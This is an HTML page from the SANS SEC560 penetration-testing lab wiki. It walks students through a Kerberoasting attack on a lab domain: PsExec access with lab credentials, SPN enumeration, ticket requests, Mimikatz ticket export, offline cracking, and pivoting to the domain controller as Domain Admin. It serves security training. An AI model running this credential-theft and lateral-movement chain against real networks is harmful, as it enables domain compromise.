@@ -1,0 +1,322 @@
+<!DOCTYPE HTML>
+<!--
+    Editorial by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+    560 Wiki made with love and care by the following people:
+    - Tim Medin (@TimMedin, @RedSiegeInfoSec) -- Project Lead, Red Siege Information Security
+    - Erik Van Buggenhout (@@ErikVaBu, @NVISOsecurity) -- Project Lead, NVISO Security
+    - Mick Douglas (@BetterSafetyNet) -- Tech lead, Intern Wrangler, InfoSec Innovations
+        - Yulli Chong -- Intern, InfoSec Innovations
+        - Aaron Sawyer (@CrashingStatic) -- Intern, InfoSec Innovations
+-->
+<html>
+    <head>
+        <title>SANS SEC560 Lab Wiki</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="css/main.css" />
+    </head>
+    <body>
+
+        <!-- Wrapper -->
+            <div id="wrapper">
+
+                <!-- Main -->
+                    <div id="main">
+                        <div class="inner">
+
+                            <!-- Header -->
+                                <header id="header">
+                                    <a href="index.html" class="logo">SANS SEC 560 Lab Wiki</a>
+                                    <ul class="icons">
+                                        <li><a href="https://twitter.com/search?q=Sec560" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                                    </ul>
+                                </header>
+
+                            <!-- Content -->
+                            <!-- Converted Markdown body (AKA HTML stubs) goes here -->
+<h1 id="lab-51-kerberos">Lab 5.1: Kerberos</h1>
+<h2 id="objectives">Objectives</h2>
+<ul>
+<li>We will obtain RC4 service tickets (TGS) for a service account using an SPN</li>
+<li>We will dump the RC4 service tickets (TGS) to disk using Mimikatz</li>
+<li>We will crack the RC4 service ticket using Tim Medin's Kerberoast toolkit (Kerberoasting)</li>
+<li>We will use the newly identified credentials to pivot to DC01 (10.10.10.5)</li>
+</ul>
+<h2 id="lab-setup">Lab Setup</h2>
+<p>You&rsquo;ll need to have your Slingshot Windows image booted for this lab. From the Slingshot Windows image, we will access TRINTIY, which is a system joined to the SEC560.local domain for which we have obtained a valid set of domain credentials. From here, our goal is to further escalate our privileges in the domain by compromising a service account.</p>
+<h2 id="lab--step-by-step-instructions">Lab &ndash; Step-by-Step Instructions</h2>
+<h4 id="step-1-open-psexec-session-to-10101010">Step 1: Open PsExec session to 10.10.10.10</h4>
+<p>Start by opening a PsExec session to TRINITY (10.10.10.10), which is joined to the SEC560.local domain.</p>
+<p><b>PLEASE MAKE SURE YOU RUN THE FOLLOWING COMMANDS IN A WINDOWS COMMAND PROMPT (NOT POWERSHELL):</b></p>
+<p>In order to obtain access to the TRINITY machine, we will use the Sysinternals PsExec tool. We used the Metasploit version of PsExec during several of our Day 4 labs. Today, we will use the original Microsoft Sysinternals tool. While it's not installed by default, it's an often-used Windows remote administration tool, so its use is often considered benign and not suspicious!</p>
+<p>First, <code>cd</code> to the directory where our PsExec is located and list the directory contents using <code>dir</code> :</p>
+<pre>
+C:\Users\sec560> <b>cd C:\Tools\SysinternalsSuite</b>
+C:\Tools\SysinternalsSuite> <b>dir</b>
+</pre>
+
+<p>In the directory, you will find the <code>PsExec64.exe</code> executable, which we will use to start a session toward TRINTITY (10.10.10.10). We will accept the PsExec EULA (using the -accepteula flag) and use a domain user called "john.doe" (using the -u flag):</p>
+<pre>
+C:\Tools\SysinternalsSuite> <b>PsExec64.exe -accepteula -u sec560.local\john.doe \\10.10.10.10 cmd.exe</b>
+</pre>
+
+<p>Upon entering the command, you will be requested to enter the password, which is <code>Sec560!</code></p>
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img01.png" style="width:100%;max-width:600px"  alt="Opening PSexec" /></p>
+<h4 id="step-2-browse-the-ctoolskerberoast-directory">Step 2. Browse the C:\Tools\Kerberoast directory</h4>
+<p>As indicated during the material, we will use the Kerberoast toolkit, which was developed by Tim Medin. We have already prepared the Kerberoast toolkit for your use on the TRINTIY machine. In an actual penetration test, we may need to copy the toolkit onto the target machine manually. Alternatively, if PowerShell Empire is used, we could use the built-in "Invoke-Kerberoast"!</p>
+<p>Tim Medin's Kerberoast toolkit is available in <code>C:\Tools\Kerberoast</code>, we will now browse the folder using <code>cd</code>:</p>
+<pre>
+C:\Windows\system32> <b>cd C:\Tools\Kerberoast</b>
+C:\Tools\Kerberoast> <b>dir</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img02.png" style="width:100%;max-width:600px"  alt="Browsing for Kerberoast" /></p>
+<h4 id="step-3-run-the-getuserspnsvbs-script">Step 3. Run the GetUserSPNs.vbs script</h4>
+<p>We will now use the GetUserSPNs.vbs script to enumerate domain users with an SPN (a Service Principle Name).</p>
+<p>We will target users with an SPN (a Service Principle Name), as these are service accounts we could target using Kerberoasting. For this, we will use the "GetUserSPNs.vbs" script, which enumerates this information:</p>
+<pre>
+C:\Tools\Kerberoast> <b>cscript.exe GetUserSPNs.vbs</b>
+</pre>
+
+<p>The output should reveal two service accounts: one is the <code>krbtgt</code> one; the other one appears to be linked to <code>SQL Server</code>. In a large enterprise environment, you would likely see hundreds or thousands of service accounts. During such an engagement, one would request service tickets for a large number of these accounts, hoping to be able to crack at least one of them.</p>
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img03.png" style="width:100%;max-width:600px"  alt="Running script to enumerate users" /></p>
+<h4 id="step-4-request-a-ticket-for-svcsqlserver">Step 4. Request a ticket for svcsqlserver</h4>
+<p>We will now request a service ticket for the target account (svcsqlserver).</p>
+<p>The <code>krbtgt</code> account is not interesting in a Kerberoast attack. The reason for this is that it is a service account generated by the system, with a long and highly random password. It is thus not feasible in an offline brute force attack such as Kerberoasting.</p>
+<p>We will thus request a service ticket for the <code>SQL Server</code> SPN, hoping that it was set up with a weak password. For this, we will use the following PowerShell commands, which are built-in in Windows and allow us to manually request service tickets:</p>
+<pre>
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'svcsqlserver/dc01.sec560.local:1433'
+</pre>
+
+<p>In our PsExec session, we will string these two together in one PowerShell invocation (this is a one-line command):</p>
+<pre>
+C:\Tools\Kerberoast> <b>powershell.exe -command "Add-Type -AssemblyName System.IdentityModel;
+ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken 
+ -ArgumentList 'svcsqlserver/dc01.sec560.local:1433'"</b>
+</pre>
+
+<p>The output of this command will indicate you now have a valid service ticket in memory.</p>
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img04.png" style="width:100%;max-width:600px"  alt="Putting in command to request a ticket for svcsqlserver" /></p>
+<h4 id="step-5-dumping-the-ticket-with-mimikatz">Step 5. Dumping the ticket with Mimikatz</h4>
+<p>As a next step, we will use Mimikatz to dump the service ticket to a file.</p>
+<p>Now that the service ticket is in memory, we'd like to extract it so we can launch an offline brute force attack. We will do this by using Mimikatz. The <code>Invoke-Kerberoast</code> module in PowerShell Empire doesn't need Mimikatz, so we could consider it to be more stealth.</p>
+<p>It's interesting to note that we are now dumping our own service tickets to a file on disk, so we do not require administrative privileges. We will run the Mimikatz <code>kerberos::list /export</code> command to dump the service tickets to disk.</p>
+<pre>
+C:\Tools\Kerberoast> <b>cd ..\Mimikatz\x64</b>
+C:\Tools\Mimikatz\x64> <b>mimikatz.exe</b>
+mimikatz # <b>kerberos::list /export</b>
+mimikatz # <b>exit</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img05.png" style="width:100%;max-width:600px"  alt="Dumping the ticket with Mimikatz" /></p>
+<p>In the output of the command, you will notice that there are a number of tickets (depending on the activity on the machine, the number of tickets may be higher or lower). When we built the lab, there were 2 tickets in memory:</p>
+<ol>
+<li>A krbtgt ticket (using the AES encryption type <code>aes_256_hmac</code>)</li>
+<li>An svcsqlserver ticket (using the RC4 encryption type <code>rc4_hmac_nt</code>)</li>
+</ol>
+<p>The krbtgt ticket is to be expected as part of the normal Kerberos operations; we are of course interested in the <code>svcsqlserver</code> ticket, which should be the only one that uses RC4.</p>
+<p>The <code>/export</code> flag ensures the tickets were now saved as .kirbi files (please refer to <code>Saved to file</code> for the full filename)!</p>
+<pre>
+C:\Tools\Mimikatz\x64> <b>dir</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img06.png" style="width:100%;max-width:600px"  alt="Mimikatz dir" /></p>
+<h4 id="step-6-copy-the-tickets-to-windows">Step 6. Copy the tickets to Windows</h4>
+<p>We will now move the service tickets offline to our Windows machine, where we will attempt to crack them.</p>
+<p>Please close the command prompt you were using up until this point. We will open a Windows explorer window to the TRINITY machine at 10.10.10.10 by entering the following network location: <code>\\10.10.10.10\c$\tools\Mimikatz\x64</code>.</p>
+<p>Should you be requested to enter credentials, please use username <code>sec560.local\john.doe</code> and password <code>Sec560!</code>.</p>
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img07.png" style="width:100%;max-width:600px"  alt="Finding tickets on Trinity machine" /></p>
+<p>Please select the .kirbi files and copy them to your Desktop. Please do NOT move the files.</p>
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img08.png" style="width:100%;max-width:600px"  alt="Moving tickets" /></p>
+<p>You can close the Windows file explorer window afterwards.</p>
+<h4 id="step-7-crack-the-password">Step 7. Crack the password</h4>
+<p>We will now try to crack the password for the svcsqlserver account using Tim Medin's toolkit.</p>
+<blockquote>
+<p>NOTE: If you encounter any issues retrieving the tickets from the domain-joined system (which could happen, as many students are attacking the same machine), please find a back-up .kirbi ticket for the svcsqlserver account in the <code>C:\CourseFiles\</code> folder on the Windows student Desktop. Should you be unable to retrieve the <code>.kirbi</code> file from the 10.10.10.10 machine, please copy it from the <code>C:\CourseFiles</code> folder locally instead.</p>
+</blockquote>
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img08b.png" style="width:100%;max-width:600px"  alt="Finding backup .kirbi files" /></p>
+<p>Please open a new, normal command prompt, from which we will now run Tim's toolkit. We will use tgsrepcrack.py, which is a Python-based tool to brute force dumped Kerberos tickets:</p>
+<pre>
+C:\Users\sec560> <b>cd C:\Tools\Kerberoast</b>
+C:\Tools\Kerberoast> <b>python tgsrepcrack.py</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img09.png" style="width:100%;max-width:600px"  alt="Running tgsrepcrack.py" /></p>
+<p>You will notice that tgsrepcrack.py requires a few options:</p>
+<ul>
+<li>A dictionary file</li>
+<li>A .kirbi file to attack</li>
+</ul>
+<p>We will use the "example.dict" as a dictionary and specify the svcsqlserver ticket (.kirbi file). Note that the name of your svcsqlserver ticket may slightly differ (see the "Saved to file" output from Mimikatz in the previous step). Again, note that we are attacking the svcsqlserver RC4 ticket:</p>
+<pre>
+C:\Tools\Kerberoast> <b>python tgsrepcrack.py example.dict C:\Users\sec560\Desktop\1-40a10000-john.doe@svcsqlserver~dc01.sec560.local~1433-SEC560.LOCAL.kirbi</b>
+</pre>
+
+<blockquote>
+<p>Note: Don't try to type the name of the ticket; use tab completion! Type the first few characters of the filename (or directory), then press tab.</p>
+</blockquote>
+<p>This will run for approximately a minute (as it runs through the dictionary), after which it should reveal the password of <code>Jabbathehut23</code>!</p>
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img10.png" style="width:100%;max-width:600px"  alt="Revealing Password" /></p>
+<h4 id="step-8-use-stolen-credential">Step 8. Use stolen credential</h4>
+<p>As a last step, we will now use our freshly stolen credential to access a second server (DC01 - 10.10.10.5).</p>
+<p>Please close the Kerberoast command prompt and open a new, standard Windows command prompt. We will again use <code>PsExec64.exe</code>, but now we will set up a session toward the domain controller (DC01 at 10.10.10.5), using our newly compromised account <code>svcsqlserver</code> account. When prompted for the password, please use <code>Jabbathehut23</code>!</p>
+<pre>
+C:\Users\sec560> <b>cd C:\Tools\SysinternalsSuite</b>
+C:\Tools\SysinternalsSuite> <b>PsExec64.exe -accepteula -u sec560.local\svcsqlserver \\10.10.10.5 cmd.exe</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img11.png" style="width:100%;max-width:600px"  alt="Using stolen credential" /></p>
+<p>You can confirm you are on the Domain Controller as the <code>svcsqlserver</code> account by running the following command:</p>
+<pre>
+C:\Windows\system32\> <b>hostname</b>
+<em>DC01</em>
+C:\Windows\system32\> <b>whoami</b>
+<em>sec560\svcsqlserver</em>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img12.png" style="width:100%;max-width:600px"  alt="Confirming you are on Domain Controller" /></p>
+<p>In the new prompt (on the domain controller), run the following command to check the groups we are a member of:</p>
+<pre>
+C:\Windows\system32> <b>net groups</b>
+</pre>
+
+<p>One of the groups should be the "Domain Admins" group!</p>
+<p><img  class="myImg"  src="pics/Ex5.1_E01_01_img13.png" style="width:100%;max-width:600px"  alt="Checking group membership" /></p>
+<p>Congratulations! You have successfully cracked a service account with domain admin privileges!</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>In conclusion, in this lab, we identified a service account that was configured with a weak password. We requested an RC4-encrypted service ticket, which allowed us to launch a brute force attack using Tim Medin's Kerberoast toolkit. Finally, we used the compromised account to obtain domain admin-level privileges in the environment.</p>
+<p>Kerberoasting is a highly effective attack technique that does not rely on missing patches or misconfigurations and can thus provide a "way in" in reasonably well-secured environments!</p>
+
+                        </div>
+                    </div>
+
+                <!-- Sidebar -->
+                    <div id="sidebar">
+                        <div class="inner">
+
+                            <!-- Search -->
+                            <!-- MBD 20180705 - Search feature is disabled for now.  Will enable it once we get OK
+                                <input type="text" name="query" id="query" placeholder="Search" />
+                                    <button onclick="myFunction()">?</button>
+                                        <script>
+                                        function myFunction() {
+                                                var x = document.getElementById("query").value;
+                                               var res =  idx.search(x);
+                                            alert(res);
+                                       </script>
+                            -->
+
+                            <!-- Menu -->
+                                <nav id="menu">
+                                    <header class="major">
+                                        <h2>Menu</h2>
+                                    </header>
+                                    <ul>
+                                        <li><a href="index.html">Homepage</a></li>
+                                        <li><a href="Getting-Started.html">Getting Started</a></li>
+                                        <li>
+                                            <span class="opener">Book 1:</span>
+                                            <ul>
+                                                <li><a href="Lab-1.1-Setting-Up-The-Image.html">Setting Up The Image</a></li>
+                                                <li><a href="Lab-1.2-Scope-and-RoE-Role-Play.html">Scope and RoE Role Play</a></li>
+                                                <li><a href="Lab-1.3-Metadata-Treasure-Hunt.html">Metadata Treasure Hunt</a></li>
+                                                <li><a href="Lab-1.4-Recon-ng-for-DNS-Analysis.html">Recon-ng for DNS Analysis</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 2:</span>
+                                            <ul>
+                                            	<li><a href="Lab-2.1-Nmap.html">Nmap</a></li>
+                                            	<li><a href="Lab-2.2-Nmap-O-sV.html">Nmap -O -sV</a></li>
+                                                <li><a href="Lab-2.3-NSE.html">NSE</a></li>
+                                                <li><a href="Lab-2.4-Nessus.html">Nessus</a></li>
+                                                <li><a href="Lab-2.5-Netcat.html">Netcat</a></li>
+                                                <li><a href="Lab-2.6-PowerShell.html">PowerShell</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 3:</span>
+                                            <ul>
+                                                <li><a href="Lab-3.1-Metasploit.html">Metasploit</a></li>
+                                                <li><a href="Lab-3.2-Meterpreter.html">Meterpreter</a></li>
+                                                <li><a href="Lab-3.3-Veil.html">Veil</a></li>
+                                                <li><a href="Lab-3.4-Port-Pivot-Relays.html">Port Pivot Relays</a></li>
+                                                <li><a href="Lab-3.5-Empire.html">Empire</a></li>
+                                                <li><a href="Lab-3.6-Running-Commands-with-sc-and-WMIC.html">Running Commands with sc and WMIC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 4:</span>
+                                            <ul>
+                                                <li><a href="Lab-4.1-Hydra-Password-Guessing.html">Hydra Password Guessing</a></li>
+                                                <li><a href="Lab-4.2-MSF-psexec-hashdump-kiwi.html">MSF psexec, hash dumping, and Kiwi</a></li>
+                                                <li><a href="Lab-4.3-MSF-pivots.html">MSF Pivots</a></li>
+                                                <li><a href="Lab-4.4-Cracking-with-JtR-and-Hashcat.html">Cracking with John the Ripper and Hashcat</a></li>
+                                                <li><a href="Lab-4.5-Sniffing-Cracking.html">Sniffing & Cracking</a></li>
+                                                <li><a href="Lab-4.6-Pass-the-Hash.html">Pash the Hash</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 5:</span>
+                                            <ul>
+                                                <li><a href="Lab-5.1-Kerberos.html">Kerberos</a></li>
+                                                <li><a href="Lab-5.2-Responder.html">Responder</a></li>
+                                                <li><a href="Lab-5.3-Bloodhound.html">Bloodhound</a></li>
+                                                <li><a href="Lab-5.4-Privilege-Escalation.html">Privilege Escalation</a></li>
+                                                <li><a href="Lab-5.5-Domain-Dominance.html">Domain Dominance</a></li>
+                                                <li><a href="Lab-5.6-ZAP-Proxy.html">ZAP Proxy</a></li>
+                                                <li><a href="Lab-5.7-Command-Injection.html">Command Injection</a></li>
+                                                <li><a href="Lab-5.8-SQL-Injection.html">SQL Injection</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 6:</span>
+                                            <ul>
+                                                <li><a href="Lab-6.1a-Connecting-to-the-Network.html">Connecting to the Network</a></li>
+                                                <li><a href="Lab-6.1b-Online-CTF-Access.html">Online CTF Access</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Cheatsheets</span>
+                                            <ul>
+                                                <li><a href="other/MetsploitCheatsheet.pdf">Metasploit</a></li>
+                                                <li><a href="other/NetcatCheatSheetV1.pdf">Netcat</a></li>
+                                                <li><a href="other/WindowsCommandLineSheetV1.pdf">Windows Command Line</a></li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </nav>
+
+
+
+                            <!-- Footer -->
+                                <footer id="footer">
+                                    <p class="copyright">&copy; Tim Medin<br>
+                                        All rights reserved. <br>
+                                        Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+                                </footer>
+
+                        </div>
+                    </div>
+
+            </div>
+
+            <!-- The Modal -->
+            <div id="myModal" class="modal">
+                <span class="close">&times;</span>
+                <img class="modal-content" id="img01">
+                <div id="caption"></div>
+            </div>
+
+        <!-- Scripts -->
+            <script src="js/jquery.min.js"></script>
+            <script src="js/skel.min.js"></script>
+            <script src="js/util.js"></script>
+            <script src="js/main.js"></script>
+
+    </body>
+</html>
